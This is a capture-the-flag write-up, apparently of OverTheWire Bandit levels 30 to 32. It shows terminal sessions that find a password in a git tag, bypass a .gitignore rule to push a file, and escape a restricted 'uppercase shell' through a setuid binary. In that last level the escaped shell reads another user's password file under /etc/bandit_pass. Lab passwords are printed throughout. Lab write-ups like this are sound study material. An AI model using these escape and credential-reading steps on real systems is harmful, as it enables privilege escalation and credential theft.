warn@kali:~/Desktop/repo/code$ ls -al
total 12
drwxrwxr-x 2 warn warn 4096 Mar 23 15:40 .
drwxrwxr-x 4 warn warn 4096 Mar 23 15:40 ..
-rw-rw-r-- 1 warn warn    1 Mar 23 15:40 gif2ascii.py

warn@kali:~/Desktop/repo/code$ cat gif2ascii.py


warn@kali:~/Desktop/repo/code$ cd ..

warn@kali:~/Desktop/repo$ ls -al
total 20
drwxrwxr-x  4 warn warn 4096 Mar 23 15:40 .
drwxr-xr-x 10 warn warn 4096 Mar 23 15:37 ..
drwxrwxr-x  2 warn warn 4096 Mar 23 15:40 code
drwxrwxr-x  7 warn warn 4096 Mar 23 15:40 .git
-rw-rw-r--  1 warn warn  134 Mar 23 15:40 README.md

warn@kali:~/Desktop/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
```

## level30

```shell
warn@kali:~/Desktop$ git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
Cloning into 'repo'...
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit30-git@bandit.labs.overthewire.org's password:
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (4/4), done.

warn@kali:~/Desktop$ cd repo

warn@kali:~/Desktop/repo$ git log                                                                    commit 62152a9969c62cb647406aa88c1b5376dcf58968 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:22 2025 +0000

    initial commit of README.md

warn@kali:~/Desktop/repo$ git show 62152a9969c62cb647406aa88c1b5376dcf58968
commit 62152a9969c62cb647406aa88c1b5376dcf58968 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:22 2025 +0000

    initial commit of README.md

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..029ba42
--- /dev/null
+++ b/README.md
@@ -0,0 +1 @@
+just an epmty file... muahaha

warn@kali:~/Desktop/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master

warn@kali:~/Desktop/repo$ cat README.md
just an epmty file... muahaha

warn@kali:~/Desktop/repo$ git checkout master                                                        Already on 'master'
Your branch is up to date with 'origin/master'.

warn@kali:~/Desktop/repo$ ls -al
total 16
drwxrwxr-x  3 warn warn 4096 Mar 23 15:44 .
drwxr-xr-x 10 warn warn 4096 Mar 23 15:44 ..
drwxrwxr-x  7 warn warn 4096 Mar 23 15:45 .git
-rw-rw-r--  1 warn warn   30 Mar 23 15:44 README.md

warn@kali:~/Desktop/repo$ cat README.md
just an epmty file... muahaha

warn@kali:~/Desktop/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master

warn@kali:~/Desktop/repo$ git tag
secret

warn@kali:~/Desktop/repo$ git show tag
fatal: ambiguous argument 'tag': unknown revision or path not in the working tree.
Use '--' to separate paths from revisions, like this:
'git <command> [<revision>...] -- [<file>...]'

warn@kali:~/Desktop/repo$ git show secret
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```

## level31

```shell
warn@kali:~/Desktop$ git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
Cloning into 'repo'...
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit31-git@bandit.labs.overthewire.org's password: 
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (4/4), done.
                                                                                        
warn@kali:~/Desktop$ cd repo
                                                                                        
warn@kali:~/Desktop/repo$ ls -al
total 20
drwxrwxr-x  3 warn warn 4096 Mar 24 13:34 .
drwxr-xr-x 11 warn warn 4096 Mar 24 13:34 ..
drwxrwxr-x  7 warn warn 4096 Mar 24 13:34 .git
-rw-rw-r--  1 warn warn    6 Mar 24 13:34 .gitignore
-rw-rw-r--  1 warn warn  147 Mar 24 13:34 README.md
                                                                                        
warn@kali:~/Desktop/repo$ cat README.md
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

                                                                                        
warn@kali:~/Desktop/repo$ git log
commit 64e7f8e9aa48ae40584d971c3cc05dee0b5638f9 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:29 2025 +0000

    initial commit
                                                                                        
warn@kali:~/Desktop/repo$ git show 64e7f8e9aa48ae40584d971c3cc05dee0b5638f9
commit 64e7f8e9aa48ae40584d971c3cc05dee0b5638f9 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:29 2025 +0000

    initial commit

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..2211df6
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1 @@
+*.txt
diff --git a/README.md b/README.md
new file mode 100644
index 0000000..0edecc0
--- /dev/null
+++ b/README.md
@@ -0,0 +1,7 @@
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
                                                                                        
warn@kali:~/Desktop/repo$ ls -al
total 20
drwxrwxr-x  3 warn warn 4096 Mar 24 13:34 .
drwxr-xr-x 11 warn warn 4096 Mar 24 13:34 ..
drwxrwxr-x  7 warn warn 4096 Mar 24 13:34 .git
-rw-rw-r--  1 warn warn    6 Mar 24 13:34 .gitignore
-rw-rw-r--  1 warn warn  147 Mar 24 13:34 README.md
                                                                                        
warn@kali:~/Desktop/repo$ cat .gitignore
*.txt
                                                                                        
warn@kali:~/Desktop/repo$ git branch -a                                    
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master
                                                                                        
warn@kali:~/Desktop/repo$ git tag      
                                                                                        
warn@kali:~/Desktop/repo$ git checkout master
Already on 'master'
Your branch is up to date with 'origin/master'.
                                                                                        
warn@kali:~/Desktop/repo$ ls -al
total 20
drwxrwxr-x  3 warn warn 4096 Mar 24 13:34 .
drwxr-xr-x 11 warn warn 4096 Mar 24 13:34 ..
drwxrwxr-x  7 warn warn 4096 Mar 24 13:36 .git
-rw-rw-r--  1 warn warn    6 Mar 24 13:34 .gitignore
-rw-rw-r--  1 warn warn  147 Mar 24 13:34 README.md
                                                                                        
warn@kali:~/Desktop/repo$ cd README.md  
cd: not a directory: README.md
                                                                                        
warn@kali:~/Desktop/repo$ cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

                                                                                        
warn@kali:~/Desktop/repo$ touch key.txt                                       
                                                                                        
warn@kali:~/Desktop/repo$ vim key.txt
                                                                                        
warn@kali:~/Desktop/repo$ git add key.txt    
The following paths are ignored by one of your .gitignore files:
key.txt
hint: Use -f if you really want to add them.
hint: Disable this message with "git config set advice.addIgnoredFile false"
                                                                                        
warn@kali:~/Desktop/repo$ vim .gitignore
                                                                                        
warn@kali:~/Desktop/repo$ git add key.txt
                                                                                        
warn@kali:~/Desktop/repo$ git commit -m "添加一个文件"
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'warn@kali.(none)')
                                                                                        
warn@kali:~/Desktop/repo$ git config --global user.email "123@123.com"
                                                                                        
warn@kali:~/Desktop/repo$ git config user.name "123"                  
                                                                                        
warn@kali:~/Desktop/repo$ git commit -m "添加一个文件"                
[master 09b5b4b] 添加一个文件
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt
                                                                                        
warn@kali:~/Desktop/repo$ git push                    
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit31-git@bandit.labs.overthewire.org's password: 
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 332 bytes | 332.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: ### Attempting to validate files... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Well done! Here is the password for the next level:
remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K 
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'                                                      
```

## level32

```shell
WELCOME TO THE UPPERCASE SHELL
>> sh
sh: 1: SH: Permission denied
>> $0
$ ls -al
total 36
drwxr-xr-x   2 root     root      4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root      4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root      3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root     root       807 Mar 31  2024 .profile
-rwsr-x---   1 bandit33 bandit32 15140 Oct 14 09:26 uppershell
$ id
uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```

## 结语

刷这个靶场的第二遍，也是学到了一些新的东西。